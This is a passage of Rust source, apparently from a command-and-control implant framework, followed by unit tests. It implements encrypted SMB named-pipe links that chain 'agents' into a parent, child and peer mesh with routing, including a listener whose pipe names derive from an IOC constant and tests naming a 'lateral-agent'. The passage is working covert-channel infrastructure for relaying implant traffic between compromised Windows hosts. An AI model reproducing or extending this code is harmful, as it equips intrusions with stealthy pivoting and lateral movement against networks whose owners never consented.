                        resp_frame.payload.len()
                    ));
                }
                let mut parent_pubkey = [0u8; 32];
                parent_pubkey.copy_from_slice(&resp_frame.payload[..32]);

                // 5. Complete ECDH.
                let peer_public = PublicKey::from(parent_pubkey);
                let shared = our_secret.diffie_hellman(&peer_public);

                // 6. Derive per-link key.
                let link_key = derive_link_key(shared.as_bytes());

                info!(
                    "p2p-pipe: link established with parent at '{pipe_addr}', link_id={:#010X}",
                    link_id
                );

                // 7. Build the P2pLink.
                let mut link = P2pLink::new(
                    link_id,
                    LinkRole::Parent,
                    P2pTransport::SmbPipe(pipe),
                    pipe_addr.to_string(), // peer addr as identifier
                    link_key,
                );
                link.transition(LinkState::Connected)
                    .map_err(|e| anyhow!("link state transition failed: {e}"))?;

                Ok(ConnectResult::Connected(link))
            }

            P2pFrameType::LinkReject => {
                let reason = resp_frame.payload.first().copied().unwrap_or(0xFF);
                let description = if reason == REJECT_CAPACITY_FULL {
                    "parent at capacity".to_string()
                } else {
                    format!("rejected with reason code {reason:#04X}")
                };

                warn!(
                    "p2p-pipe: link rejected by parent at '{pipe_addr}': {description}"
                );

                Ok(ConnectResult::Rejected { reason, description })
            }

            other => Err(anyhow!(
                "unexpected response frame type: {:?}",
                other
            )),
        }
    }

    // Re-use shared handshake helpers from parent scope.
    use super::{derive_link_key, parse_link_request, build_link_request_payload, build_link_accept_payload, build_link_reject_payload};

    // ── P2P pipe listener ────────────────────────────────────────────────

    /// Parent-side SMB named-pipe listener that accepts incoming P2P link
    /// requests from child agents.
    pub struct P2pPipeListener {
        /// The pipe path (e.g. `\\.\pipe\<IOC>-p2p-<xxxx>`).
        pipe_path: String,
        /// The server pipe handle (used to create new instances for
        /// future connections after the current one is accepted).
        server_handle: std::sync::Arc<Mutex<*mut std::ffi::c_void>>,
        /// Maximum number of child links (capacity check).
        max_children: usize,
        /// This agent's ID.
        agent_id: String,
    }

    // SAFETY: server_handle is protected by Mutex.
    unsafe impl Send for P2pPipeListener {}
    unsafe impl Sync for P2pPipeListener {}

    impl P2pPipeListener {
        /// Create a P2P pipe listener.
        ///
        /// Creates the named pipe at
        /// `\\.\pipe\<IOC_PIPE_NAME>-p2p-<suffix>` where `<suffix>` is a
        /// random 4-hex-char string.
        pub fn create(agent_id: String, max_children: usize) -> Result<Self> {
            let suffix = Self::random_suffix();
            let pipe_name = format!(
                "{}-p2p-{}",
                common::ioc::IOC_PIPE_NAME,
                suffix
            );
            let pipe_path = format!(r"\\.\pipe\{}", pipe_name);

            let max_instances = (max_children + 2) as u32; // headroom

            info!(
                "p2p-pipe: creating named pipe '{}' (max_instances={max_instances})",
                pipe_path
            );

            let server_handle = unsafe { create_named_pipe(&pipe_path, max_instances)? };

            info!("p2p-pipe: named pipe created successfully");

            Ok(Self {
                pipe_path,
                server_handle: std::sync::Arc::new(Mutex::new(server_handle)),
                max_children,
                agent_id,
            })
        }

        /// Generate a random 4-hex-char suffix.
        fn random_suffix() -> String {
            use rand::Rng;
            let v: u16 = rand::thread_rng().gen();
            format!("{:04x}", v)
        }

        /// Return the pipe path for informational purposes.
        pub fn pipe_path(&self) -> &str {
            &self.pipe_path
        }

        /// Accept one incoming connection, perform the link handshake,
        /// and return a `P2pListenerEvent`.
        ///
        /// This is a **blocking** call (NT pipe I/O is synchronous) and
        /// should be called from `spawn_blocking`.
        pub fn accept_one(&self) -> P2pListenerEvent {
            // 1. FSCTL_PIPE_LISTEN — wait for a client.
            {
                let handle = *self.server_handle.lock().unwrap();
                if let Err(e) = unsafe { pipe_listen(handle) } {
                    return P2pListenerEvent::ListenerError(format!(
                        "FSCTL_PIPE_LISTEN failed: {e}"
                    ));
                }
            }

            // 2. The server handle is now connected to a client.
            //    Create a new pipe instance for future connections and steal
            //    the current (now-connected) handle for the client.
            let connected_handle = {
                let mut guard = self.server_handle.lock().unwrap();
                let old = *guard;
                let max_inst = (self.max_children + 2) as u32;
                match unsafe { create_named_pipe(&self.pipe_path, max_inst) } {
                    Ok(new_server) => {
                        *guard = new_server;
                        old
                    }
                    Err(e) => {
                        // Can't create a replacement, but the current
                        // connection is still valid.  Log and continue.
                        warn!("p2p-pipe: failed to create replacement pipe: {e}");
                        old
                    }
                }
            };

            let pipe = std::sync::Arc::new(NtPipeHandle::new(connected_handle));

            // 3. Read the LinkRequest frame.
            let frame = match pipe.read_frame() {
                Ok(f) => f,
                Err(e) => {
                    return P2pListenerEvent::LinkRejected {
                        reason: 0xFF,
                        description: format!("failed to read LinkRequest: {e}"),
                    };
                }
            };

            if frame.frame_type != P2pFrameType::LinkRequest {
                return P2pListenerEvent::LinkRejected {
                    reason: 0xFF,
                    description: format!(
                        "expected LinkRequest, got {:?}",
                        frame.frame_type
                    ),
                };
            }

            // 4. Parse the LinkRequest payload.
            let (child_agent_id, child_pubkey) = match parse_link_request(&frame.payload) {
                Ok(v) => v,
                Err(e) => {
                    return P2pListenerEvent::LinkRejected {
                        reason: 0xFF,
                        description: format!("invalid LinkRequest payload: {e}"),
                    };
                }
            };

            info!(
                "p2p-pipe: received LinkRequest from agent '{}', link_id={:#010X}",
                child_agent_id, frame.link_id
            );

            // 5. X25519 ECDH key exchange.
            let our_secret = EphemeralSecret::random_from_rng(rand::thread_rng());
            let our_public = PublicKey::from(&our_secret);
            let peer_public = PublicKey::from(child_pubkey);
            let shared = our_secret.diffie_hellman(&peer_public);

            // 6. Derive per-link ChaCha20-Poly1305 key via HKDF-SHA256.
            let link_key = derive_link_key(shared.as_bytes());

            // 7. Send LinkAccept with our public key.
            let accept_payload = build_link_accept_payload(our_public.as_bytes());
            let accept_frame = P2pFrame {
                frame_type: P2pFrameType::LinkAccept,
                link_id: frame.link_id,
                payload_len: accept_payload.len() as u32,
                payload: accept_payload,
            };

            if let Err(e) = pipe.write_frame(&accept_frame) {
                return P2pListenerEvent::LinkRejected {
                    reason: 0xFF,
                    description: format!("failed to send LinkAccept: {e}"),
                };
            }

            info!(
                "p2p-pipe: LinkAccept sent to agent '{}', link_id={:#010X}",
                child_agent_id, frame.link_id
            );

            // 8. Build and return the P2pLink.
            let mut link = P2pLink::new(
                frame.link_id,
                LinkRole::Child,
                P2pTransport::SmbPipe(pipe),
                child_agent_id,
                link_key,
            );

            if let Err(e) = link.transition(LinkState::Connected) {
                return P2pListenerEvent::LinkRejected {
                    reason: 0xFF,
                    description: format!("link state transition failed: {e}"),
                };
            }

            P2pListenerEvent::LinkEstablished(link)
        }

        /// Accept a connection with capacity checking against the mesh.
        ///
        /// If the mesh is at capacity, sends `LinkReject` with reason
        /// `REJECT_CAPACITY_FULL` and closes the pipe handle.
        pub fn accept_with_capacity(
            &self,
            current_child_count: usize,
        ) -> P2pListenerEvent {
            // Pre-check capacity: reject before doing any I/O if possible.
            if current_child_count >= self.max_children {
                // We haven't called pipe_listen yet, so we can just report
                // the rejection without any network activity.  The caller
                // should handle this case (e.g. by not calling accept at
                // all if at capacity).
                //
                // However, since we need to actually accept the pipe
                // connection first (otherwise the pipe instance is consumed),
                // we proceed with accept_one and then reject.
                let event = self.accept_one();

                // If a link was established, we need to immediately
                // disconnect it since we're at capacity.
                if let P2pListenerEvent::LinkEstablished(link) = event {
                    // Send LinkReject on the pipe before dropping.
                    if let P2pTransport::SmbPipe(ref pipe) = link.transport {
                        let reject_payload = build_link_reject_payload(REJECT_CAPACITY_FULL);
                        let reject_frame = P2pFrame {
                            frame_type: P2pFrameType::LinkReject,
                            link_id: link.link_id,
                            payload_len: reject_payload.len() as u32,
                            payload: reject_payload,
                        };
                        let _ = pipe.write_frame(&reject_frame);
                    }
                    // Link goes out of scope; NtPipeHandle::drop closes the handle.
                    warn!(
                        "p2p-pipe: rejected link from '{}' — capacity full ({}/{})",
                        link.peer_agent_id,
                        current_child_count,
                        self.max_children
                    );
                    return P2pListenerEvent::LinkRejected {
                        reason: REJECT_CAPACITY_FULL,
                        description: format!(
                            "capacity full: {}/{max_children} children",
                            current_child_count,
                            max_children = self.max_children
                        ),
                    };
                }
                return event;
            }

            self.accept_one()
        }

        /// Spawn the listener as a background task that delivers events
        /// via a `tokio::sync::mpsc` channel.
        ///
        /// The NT pipe I/O runs on `spawn_blocking` threads.  Each accepted
        /// connection produces one `P2pListenerEvent` on the channel.
        pub fn spawn(
            self,
            tx: tokio::sync::mpsc::Sender<P2pListenerEvent>,
        ) -> tokio::task::JoinHandle<()> {
            tokio::spawn(async move {
                loop {
                    // Borrow the listener inside spawn_blocking.
                    let listener = &self;

                    let event =
                        tokio::task::spawn_blocking(move || listener.accept_one()).await;

                    match event {
                        Ok(evt) => {
                            if tx.send(evt).await.is_err() {
                                info!("p2p-pipe: receiver dropped, shutting down listener");
                                break;
                            }
                        }
                        Err(e) => {
                            let err_evt = P2pListenerEvent::ListenerError(format!(
                                "accept_one task panicked: {e}"
                            ));
                            if tx.send(err_evt).await.is_err() {
                                break;
                            }
                            // Don't continue after a panic.
                            break;
                        }
                    }
                }
            })
        }
    }

    impl Drop for P2pPipeListener {
        fn drop(&mut self) {
            let handle = *self.server_handle.lock().unwrap();
            if !handle.is_null() {
                let _ = unsafe { close_handle(handle) };
            }
        }
    }
}

// ══════════════════════════════════════════════════════════════════════════
// Non-Windows / non-smb-pipe-transport stubs
// ══════════════════════════════════════════════════════════════════════════

#[cfg(not(all(windows, feature = "smb-pipe-transport")))]
pub mod nt_pipe_server {
    //! Stub module — SMB pipe listener is only available on Windows with
    //! the `smb-pipe-transport` feature.

    /// LinkReject reason: capacity full (stub constant).
    pub const REJECT_CAPACITY_FULL: u8 = 0x01;

    /// Stub listener — always returns an error on `create`.
    pub struct P2pPipeListener {
        _private: (),
    }

    impl P2pPipeListener {
        pub fn create(
            _agent_id: String,
            _max_children: usize,
        ) -> anyhow::Result<Self> {
            Err(anyhow::anyhow!(
                "p2p-pipe: SMB named-pipe listener is only available on Windows \
                 with the `smb-pipe-transport` feature"
            ))
        }

        pub fn pipe_path(&self) -> &str {
            ""
        }
    }

    /// Stub connect result — mirrors the Windows variant's API.
    #[derive(Debug)]
    pub enum ConnectResult {
        Connected(super::P2pLink),
        Rejected { reason: u8, description: String },
    }

    /// Stub connector — always returns an error.
    pub fn connect(
        _pipe_addr: &str,
        _agent_id: &str,
        _link_id: u32,
    ) -> anyhow::Result<ConnectResult> {
        Err(anyhow::anyhow!(
            "p2p-pipe: SMB named-pipe connector is only available on Windows \
             with the `smb-pipe-transport` feature"
        ))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn test_secret() -> [u8; 32] {
        [0xAA; 32]
    }

    /// Create a dummy `P2pTransport::TcpStream` for tests.
    ///
    /// When the `p2p-tcp` feature is enabled the variant carries an
    /// `Arc<Mutex<TcpP2pHandle>>`, which requires a real TCP stream.
    /// We spin up a transient loopback listener and connect to it.
    #[cfg(feature = "p2p-tcp")]
    fn dummy_tcp_transport() -> P2pTransport {
        let rt = tokio::runtime::Runtime::new().unwrap();
        rt.block_on(async {
            let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
            let addr = listener.local_addr().unwrap();
            let client = tokio::net::TcpStream::connect(addr).await.unwrap();
            let handle = tcp_transport::TcpP2pHandle::new(client);
            P2pTransport::TcpStream(std::sync::Arc::new(tokio::sync::Mutex::new(handle)))
        })
    }

    #[cfg(not(feature = "p2p-tcp"))]
    fn dummy_tcp_transport() -> P2pTransport {
        P2pTransport::TcpStream
    }

    #[test]
    fn link_state_transitions_valid() {
        let mut link = P2pLink::new(
            1,
            LinkRole::Child,
            dummy_tcp_transport(),
            "peer".to_string(),
            test_secret(),
        );
        assert_eq!(link.state, LinkState::Linking);

        link.transition(LinkState::Connected).unwrap();
        assert_eq!(link.state, LinkState::Connected);

        link.transition(LinkState::Dead).unwrap();
        assert_eq!(link.state, LinkState::Dead);

        link.transition(LinkState::Disconnected).unwrap();
        assert_eq!(link.state, LinkState::Disconnected);
    }

    #[test]
    fn link_state_rejects_illegal_transition() {
        let mut link = P2pLink::new(
            1,
            LinkRole::Child,
            dummy_tcp_transport(),
            "peer".to_string(),
            test_secret(),
        );
        link.transition(LinkState::Connected).unwrap();
        let err = link.transition(LinkState::Linking).unwrap_err();
        assert!(err.contains("illegal link state transition"));
    }

    #[test]
    fn mesh_insert_and_remove() {
        let mut mesh = P2pMesh::new("agent-1".to_string(), 4);

        let mut parent = P2pLink::new(
            10,
            LinkRole::Parent,
            dummy_tcp_transport(),
            "server".to_string(),
            test_secret(),
        );
        parent.transition(LinkState::Connected).unwrap();
        mesh.insert_link(parent);
        assert!(mesh.parent_link_id == Some(10));
        assert!(mesh.has_connected_parent());

        let child = P2pLink::new(
            20,
            LinkRole::Child,
            dummy_tcp_transport(),
            "child-1".to_string(),
            test_secret(),
        );
        mesh.insert_link(child);
        assert_eq!(mesh.child_link_ids.len(), 1);

        let removed = mesh.remove_link(10).unwrap();
        assert_eq!(removed.link_id, 10);
        assert!(mesh.parent_link_id.is_none());
        assert!(!mesh.has_connected_parent());
    }

    #[test]
    fn mesh_max_children() {
        let mut mesh = P2pMesh::new("agent-1".to_string(), 2);
        assert!(mesh.can_accept_child());

        mesh.insert_link(P2pLink::new(
            1,
            LinkRole::Child,
            dummy_tcp_transport(),
            "c1".to_string(),
            test_secret(),
        ));
        assert!(mesh.can_accept_child());

        mesh.insert_link(P2pLink::new(
            2,
            LinkRole::Child,
            dummy_tcp_transport(),
            "c2".to_string(),
            test_secret(),
        ));
        assert!(!mesh.can_accept_child());
    }

    #[test]
    fn pending_forwards_queue() {
        let mut link = P2pLink::new(
            1,
            LinkRole::Child,
            dummy_tcp_transport(),
            "peer".to_string(),
            test_secret(),
        );
        link.enqueue_forward(vec![1, 2, 3]);
        link.enqueue_forward(vec![4, 5, 6]);
        assert_eq!(link.pending_forwards.len(), 2);

        let drained = link.drain_pending();
        assert_eq!(drained.len(), 2);
        assert!(link.pending_forwards.is_empty());
    }

    #[test]
    #[cfg(all(windows, feature = "smb-pipe-transport"))]
    fn parse_link_request_roundtrip() {
        use nt_pipe_server::*;

        let agent_id = "test-agent-123";
        let pubkey = [0xBB; 32];

        let mut payload = Vec::new();
        payload.extend_from_slice(&(agent_id.len() as u16).to_le_bytes());
        payload.extend_from_slice(agent_id.as_bytes());
        payload.extend_from_slice(&pubkey);

        let (parsed_id, parsed_key) = parse_link_request(&payload).unwrap();
        assert_eq!(parsed_id, agent_id);
        assert_eq!(parsed_key, pubkey);
    }

    #[test]
    #[cfg(all(windows, feature = "smb-pipe-transport"))]
    fn parse_link_request_too_short() {
        use nt_pipe_server::*;
        let result = parse_link_request(&[0x01, 0x02]);
        assert!(result.is_err());
    }

    #[test]
    #[cfg(all(windows, feature = "smb-pipe-transport"))]
    fn derive_link_key_deterministic() {
        use nt_pipe_server::*;

        let secret = [0x42; 32];
        let key1 = derive_link_key(&secret);
        let key2 = derive_link_key(&secret);
        assert_eq!(key1, key2);

        let other = [0x43; 32];
        let key3 = derive_link_key(&other);
        assert_ne!(key1, key3);
    }

    #[test]
    fn link_type_default_matches_role() {
        let link = P2pLink::new(
            1,
            LinkRole::Parent,
            dummy_tcp_transport(),
            "peer".to_string(),
            test_secret(),
        );
        assert_eq!(link.link_type, LinkType::Parent);
        assert_eq!(link.role, LinkRole::Parent);

        let link2 = P2pLink::new(
            2,
            LinkRole::Child,
            dummy_tcp_transport(),
            "peer".to_string(),
            test_secret(),
        );
        assert_eq!(link2.link_type, LinkType::Child);
    }

    #[test]
    fn link_type_peer_explicit() {
        let link = P2pLink::new_with_type(
            42,
            LinkRole::Child,
            LinkType::Peer,
            dummy_tcp_transport(),
            "lateral-agent".to_string(),
            test_secret(),
        );
        assert_eq!(link.link_type, LinkType::Peer);
        assert_eq!(link.role, LinkRole::Child);
    }

    #[test]
    fn mesh_default_mode_is_hybrid() {
        let mesh = P2pMesh::default();
        assert_eq!(mesh.mesh_mode, MeshMode::Hybrid);
        assert_eq!(mesh.max_peers, P2pMesh::DEFAULT_MAX_PEERS);
    }

    #[test]
    fn mesh_peer_link_tracking() {
        let mut mesh = P2pMesh::new("agent-1".to_string(), 4);

        let peer = P2pLink::new_with_type(
            100,
            LinkRole::Child, // initiator perspective
            LinkType::Peer,
            dummy_tcp_transport(),
            "peer-1".to_string(),
            test_secret(),
        );
        mesh.insert_link(peer);

        assert!(mesh.child_link_ids.is_empty());
        assert!(mesh.peer_link_ids.contains(&100));
        assert!(mesh.can_accept_peer());
    }

    #[test]
    fn mesh_peer_capacity() {
        let mut mesh = P2pMesh::new_with_mode(
            "agent-1".to_string(),
            4,
            1,
            MeshMode::Hybrid,
        );
        assert!(mesh.can_accept_peer());

        mesh.insert_link(P2pLink::new_with_type(
            1,
            LinkRole::Child,
            LinkType::Peer,
            dummy_tcp_transport(),
            "p1".to_string(),
            test_secret(),
        ));
        assert!(!mesh.can_accept_peer());
    }

    #[test]
    fn routing_table_basic() {
        let mut mesh = P2pMesh::new("agent-1".to_string(), 4);

        // Add a route.
        assert!(mesh.update_route(0xAAAA, 10, 2, 0.9));
        assert_eq!(mesh.route_to(0xAAAA), Some(10));

        // Better route (lower hop count).
        assert!(mesh.update_route(0xAAAA, 20, 1, 0.95));
        assert_eq!(mesh.route_to(0xAAAA), Some(20));

        // Worse route (higher hop count) — should not update.
        assert!(!mesh.update_route(0xAAAA, 30, 3, 0.8));
        assert_eq!(mesh.route_to(0xAAAA), Some(20));

        // No route for unknown destination.
        assert_eq!(mesh.route_to(0xBBBB), None);
    }

    #[test]
    fn routing_table_merge_update() {
        let mut mesh = P2pMesh::new("agent-1".to_string(), 4);

        let entries = vec![
            common::p2p_proto::RouteEntry {
                destination: 1,
                next_hop: 0, // will be overridden
                hop_count: 2,
                route_quality: 0.8,
            },
            common::p2p_proto::RouteEntry {
                destination: 2,
                next_hop: 0,
                hop_count: 1,
                route_quality: 1.0,
            },
        ];

        mesh.merge_route_update(&entries, 42);
        assert_eq!(mesh.route_to(1), Some(42));
        assert_eq!(mesh.route_to(2), Some(42));

        // Hop count should be incremented by 1.
        let snapshot = mesh.routing_table_snapshot();
        let entry1 = snapshot.iter().find(|e| e.destination == 1).unwrap();
        assert_eq!(entry1.hop_count, 3); // 2 + 1
    }

    #[test]
    fn routing_table_remove_via() {
        let mut mesh = P2pMesh::new("agent-1".to_string(), 4);
        mesh.update_route(1, 10, 1, 0.9);
        mesh.update_route(2, 10, 2, 0.8);
        mesh.update_route(3, 20, 1, 0.9);

        mesh.remove_routes_via(10);
        assert_eq!(mesh.route_to(1), None);
        assert_eq!(mesh.route_to(2), None);
        assert_eq!(mesh.route_to(3), Some(20)); // not via 10
    }

    #[test]
    fn mesh_remove_link_clears_peers() {
        let mut mesh = P2pMesh::new("agent-1".to_string(), 4);
        mesh.insert_link(P2pLink::new_with_type(
            50,
            LinkRole::Child,
            LinkType::Peer,
            dummy_tcp_transport(),
            "p1".to_string(),
            test_secret(),
        ));
        assert!(mesh.peer_link_ids.contains(&50));

        mesh.remove_link(50);
        assert!(!mesh.peer_link_ids.contains(&50));
        assert!(mesh.links.is_empty());
    }
}
